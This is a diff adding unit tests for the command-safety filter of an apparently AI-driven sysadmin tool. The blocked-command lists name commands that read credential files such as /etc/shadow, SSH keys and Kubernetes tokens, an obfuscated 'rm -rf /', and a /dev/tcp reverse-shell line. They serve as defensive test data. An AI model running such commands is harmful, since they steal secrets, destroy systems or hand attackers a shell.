@@ -24,6 +24,7 @@ from sysadmin_ai import (
     REDACT_PLACEHOLDER,
     MAX_HISTORY_MESSAGES,
     MAX_OUTPUT_CHARS,
+    DEFAULT_COMMAND_TIMEOUT,
     _IS_WINDOWS,
     _IS_MACOS,
     Executor,
@@ -34,7 +35,10 @@ from sysadmin_ai import (
     _check_write_content_safety,
     read_file_content,
     write_file_content,
+    safe_read_file,
+    safe_write_file,
     parse_args,
+    start_health_server,
     _wrap_tool_output,
     _extract_script_path,
     _check_script_execution_safety,
@@ -1547,6 +1551,223 @@ class TestSafeCommandsNotBroken(unittest.TestCase):
                     safety, "safe",
                     f"{cmd!r} should be safe, got {safety} ({reason})"
                 )
+
+
+# ------------------------------------------------------------------ #
+# 28. Alternative readers blocked (C1)                                 #
+# ------------------------------------------------------------------ #
+class TestAlternativeReadersBlocked(unittest.TestCase):
+    """Alternative readers targeting sensitive files must be blocked."""
+
+    _BLOCKED = [
+        "less /etc/shadow",
+        "more /etc/shadow",
+        "head /etc/shadow",
+        "tail /etc/shadow",
+        "tac /etc/shadow",
+        "nl /etc/shadow",
+        "strings /etc/shadow",
+        "xxd /etc/shadow",
+        "hexdump /etc/shadow",
+        "od /etc/shadow",
+        "grep root /etc/shadow",
+        "awk '{print}' /etc/shadow",
+        "sed -n '1p' /etc/shadow",
+        "less /etc/gshadow",
+        "head ~/.ssh/id_rsa",
+        "strings /etc/ssh/ssh_host_rsa_key",
+        "tail /var/run/secrets/kubernetes.io/serviceaccount/token",
+        "head /proc/1/environ",
+        "strings /proc/self/environ",
+    ]
+
+    def test_alternative_readers_blocked(self):
+        for cmd in self._BLOCKED:
+            with self.subTest(cmd=cmd):
+                safety, reason = check_command_safety(cmd)
+                self.assertEqual(
+                    safety, "blocked",
+                    f"{cmd!r} should be blocked, got {safety} ({reason})"
+                )
+
+
+# ------------------------------------------------------------------ #
+# 29. Alternative readers on safe files (C1 regression)                #
+# ------------------------------------------------------------------ #
+class TestAlternativeReadersOnSafeFiles(unittest.TestCase):
+    """Alternative readers on non-sensitive files must remain safe."""
+
+    _SAFE = [
+        "less /var/log/syslog",
+        "head -n 20 /etc/hostname",
+        "tail -f /var/log/auth.log",
+        "strings /usr/bin/ls",
+        "grep error /var/log/messages",
+        "awk '{print $1}' /tmp/data.csv",
+    ]
+
+    def test_safe_alternative_readers(self):
+        for cmd in self._SAFE:
+            with self.subTest(cmd=cmd):
+                safety, reason = check_command_safety(cmd)
+                self.assertEqual(
+                    safety, "safe",
+                    f"{cmd!r} should be safe, got {safety} ({reason})"
+                )
+
+
+# ------------------------------------------------------------------ #
+# 30. Shell obfuscation blocked (C1)                                   #
+# ------------------------------------------------------------------ #
+class TestShellObfuscationBlocked(unittest.TestCase):
+    """Shell obfuscation patterns must be blocked."""
+
+    _BLOCKED = [
+        "$'\\x72\\x6d' -rf /",
+        "$'\\162\\155' -rf /",
+    ]
+
+    def test_shell_obfuscation_blocked(self):
+        for cmd in self._BLOCKED:
+            with self.subTest(cmd=cmd):
+                safety, reason = check_command_safety(cmd)
+                self.assertEqual(
+                    safety, "blocked",
+                    f"{cmd!r} should be blocked, got {safety} ({reason})"
+                )
+
+
+# ------------------------------------------------------------------ #
+# 31. Configurable command timeout (C2)                                #
+# ------------------------------------------------------------------ #
+class TestCommandTimeout(unittest.TestCase):
+    """Command timeout should be configurable via CLI and env var."""
+
+    def test_default_constant(self):
+        self.assertEqual(DEFAULT_COMMAND_TIMEOUT, 30)
+
+    def test_cli_parsing(self):
+        original = sys.argv
+        try:
+            sys.argv = ["sysadmin_ai.py", "--command-timeout", "120"]
+            args = parse_args()
+            self.assertEqual(args.command_timeout, 120)
+        finally:
+            sys.argv = original
+
+    def test_default_timeout_from_cli(self):
+        original = sys.argv
+        try:
+            sys.argv = ["sysadmin_ai.py"]
+            args = parse_args()
+            self.assertEqual(args.command_timeout, DEFAULT_COMMAND_TIMEOUT)
+        finally:
+            sys.argv = original
+
+    def test_custom_timeout_causes_timeout(self):
+        """A very short timeout should cause a timeout status."""
+        if _IS_WINDOWS:
+            cmd = "ping -n 10 127.0.0.1"
+        else:
+            cmd = "sleep 10"
+        executor = HostExecutor()
+        output, status, _ = executor.execute(cmd, cwd=HOME, timeout=1)
+        self.assertEqual(status, "timeout")
+        self.assertIn("timed out", output.lower())
+
+
+# ------------------------------------------------------------------ #
+# 32. safe_read_file wrapper (C3)                                      #
+# ------------------------------------------------------------------ #
+class TestSafeReadFile(unittest.TestCase):
+    """safe_read_file should combine safety checks with file reading."""
+
+    def test_safe_file_reads_normally(self):
+        content, status = safe_read_file(__file__, os.path.dirname(__file__))
+        self.assertEqual(status, "success")
+        self.assertIn("import unittest", content)
+
+    def test_blocked_file_returns_blocked(self):
+        content, status = safe_read_file("/etc/shadow", "/")
+        self.assertEqual(status, "blocked")
+        self.assertIn("BLOCKED", content)
+
+    def test_nonexistent_file_returns_error(self):
+        content, status = safe_read_file("nonexistent_xyz_42.txt", os.path.dirname(__file__))
+        self.assertEqual(status, "error")
+        self.assertIn("not found", content.lower())
+
+
+# ------------------------------------------------------------------ #
+# 33. safe_write_file wrapper (C4)                                     #
+# ------------------------------------------------------------------ #
+class TestSafeWriteFile(unittest.TestCase):
+    """safe_write_file should combine safety checks with file writing."""
+
+    def test_safe_write_succeeds(self):
+        tmpdir = tempfile.mkdtemp()
+        path = os.path.join(tmpdir, "test_safe_write.txt")
+        try:
+            msg, status = safe_write_file(path, "hello safe", tmpdir)
+            self.assertEqual(status, "success")
+            self.assertIn("Successfully wrote", msg)
+            with open(path, "r") as f:
+                self.assertEqual(f.read(), "hello safe")
+        finally:
+            if os.path.exists(path):
+                os.unlink(path)
+            os.rmdir(tmpdir)
+
+    def test_blocked_path_returns_blocked(self):
+        msg, status = safe_write_file("/etc/passwd", "evil", "/")
+        self.assertEqual(status, "blocked")
+        self.assertIn("BLOCKED", msg)
+
+    def test_dangerous_content_returns_blocked(self):
+        tmpdir = tempfile.mkdtemp()
+        path = os.path.join(tmpdir, "script.sh")
+        try:
+            msg, status = safe_write_file(path, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", tmpdir)
+            self.assertEqual(status, "blocked")
+            self.assertIn("BLOCKED", msg)
+        finally:
+            os.rmdir(tmpdir)
+
+    def test_etc_path_returns_confirm(self):
+        msg, status = safe_write_file("/etc/nginx/nginx.conf", "server {}", "/")
+        self.assertEqual(status, "confirm")
+
+
+# ------------------------------------------------------------------ #
+# 34. Health endpoint bind address (C5)                                #
+# ------------------------------------------------------------------ #
+class TestHealthBindAddress(unittest.TestCase):
+    """start_health_server should accept bind_address parameter."""
+
+    def test_accepts_bind_address(self):
+        """start_health_server should accept a bind_address parameter."""
+        # Use port 0 so OS assigns an available port; bind to localhost
+        server = start_health_server(port=0, bind_address="127.0.0.1")
+        self.assertIsNotNone(server)
+        server.shutdown()
+
+    def test_health_bind_cli_flag(self):
+        original = sys.argv
+        try:
+            sys.argv = ["sysadmin_ai.py", "--health-bind", "0.0.0.0"]
+            args = parse_args()
+            self.assertEqual(args.health_bind, "0.0.0.0")
+        finally:
+            sys.argv = original
+
+    def test_health_bind_default_none(self):
+        original = sys.argv
+        try:
+            sys.argv = ["sysadmin_ai.py"]
+            args = parse_args()
+            self.assertIsNone(args.health_bind)
+        finally:
+            sys.argv = original
 
 
 # ------------------------------------------------------------------ #
